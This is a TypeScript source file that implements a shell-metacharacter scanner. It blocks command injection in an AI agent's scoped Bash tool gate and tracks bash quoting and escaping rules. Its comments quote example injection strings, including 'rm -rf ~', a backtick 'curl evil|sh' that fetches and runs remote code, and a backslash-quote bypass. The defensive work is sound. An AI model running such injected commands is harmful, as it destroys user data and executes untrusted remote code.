// packages/@monomind/cli/src/orgrt/agent-exec-shell-syntax.ts
// Split out of agent-exec.ts (file-size rule): the scoped-mode Bash
// metacharacter scanner used by agent exec's canUseTool gate.

// A prefix match on its own only checks the FIRST token — the whole
// string still runs through a real shell, so `monomind org list; rm -rf
// ~` or `` monomind org list `curl evil|sh` `` would pass a bare
// startsWith() check and then execute the injected part too. Reject any
// command containing shell metacharacters that could chain, substitute,
// or redirect beyond the single literal invocation the prefix implies.
//
// This has to match real bash quoting rules, not just "any of these
// characters anywhere" — a caller legitimately passing a JSON blob via
// `--json '{"goal":"grow revenue & cut costs"}'` (org create-json's own
// documented usage) has a bare `&` sitting right there, and inside single
// quotes bash treats it as fully literal, same as `;`, `|`, a backtick, or
// `>`/`<` — none of those are special there. Only three quoting states
// matter: inside single quotes NOTHING is special (not even backtick/$());
// inside double quotes only backtick and $( still trigger substitution;
// outside any quotes everything below is live.
//
// Backslash-escaping must also be tracked explicitly — an earlier version
// of this scanner didn't, which let `foo \'; touch /tmp/PWNED` slip
// through: it treated the backslash-escaped `'` as a real quote-toggle
// (entering "single-quoted" state), which then hid the trailing `;` from
// detection — while bash itself sees `\'` outside any quotes as nothing
// more than a literal `'` character, `;` still ends the command right
// there. Outside single quotes, a `\` consumes and neutralizes the next
// character (it can never toggle quote state or count as a metachar);
// inside single quotes, backslash has no special meaning at all in bash,
// so it's left to fall through to the "fully literal" branch untouched.
export const hasUnsafeShellSyntax = (cmd: string): boolean => {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < cmd.length; i++) {
    const c = cmd[i];
    if (c === '\\' && !inSingle) {
      i++; // skip the escaped character — never quote-toggling, never a metachar
      continue;
    }
    if (c === "'" && !inDouble) {
      inSingle = !inSingle;
      continue;
    }
    if (c === '"' && !inSingle) {
      inDouble = !inDouble;
      continue;
    }
    if (inSingle) continue; // fully literal — nothing below applies
    if (c === '`') return true; // substitution — live even inside "..."
    if (c === '$' && cmd[i + 1] === '(') return true; // $( ... ) — same
    if (inDouble) continue; // ;,&,|,<,>,\n are literal inside "..."
    if (c === ';' || c === '&' || c === '|' || c === '\n') return true;
    if (c === '>' || c === '<') return true;
    if (c === '<' && cmd[i + 1] === '(') return true; // redundant but explicit
  }
  return false;
};
